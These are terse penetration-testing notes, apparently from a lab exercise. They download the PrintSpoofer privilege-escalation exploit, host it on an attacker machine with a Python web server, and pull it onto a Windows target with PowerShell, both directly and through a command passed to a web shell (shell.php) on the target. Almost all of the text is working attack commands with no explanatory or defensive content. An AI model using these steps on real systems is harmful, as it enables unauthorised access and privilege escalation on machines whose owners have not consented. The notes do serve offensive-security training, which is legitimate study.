sudo wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe

- kali install
  sudo apt update && sudo apt install windows-binaries

- local
  python3 -m http.server 80

- target
  powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"

```ps1
http://192.168.58.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
```
